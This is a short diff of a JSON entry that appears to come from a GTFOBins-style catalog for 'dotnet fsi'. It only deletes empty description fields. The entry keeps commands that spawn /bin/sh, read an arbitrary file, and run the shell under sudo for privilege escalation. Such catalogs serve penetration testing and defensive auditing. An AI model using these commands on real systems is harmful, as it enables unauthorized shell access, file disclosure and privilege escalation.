@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
       }
     ]
